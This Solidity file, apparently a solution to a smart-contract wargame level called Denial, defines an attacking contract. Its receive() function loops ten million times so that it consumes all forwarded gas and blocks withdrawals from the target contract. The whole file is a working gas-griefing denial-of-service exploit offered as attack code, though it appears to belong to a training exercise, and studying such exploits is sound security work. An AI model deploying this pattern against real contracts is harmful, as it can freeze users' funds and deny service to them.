// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        uint j;
        // create a function that costs a lot of gas to calculate
        for (uint i = 0; i < 10000000; i++) {
            j = (i * i) / 10000;
        }
    }
}
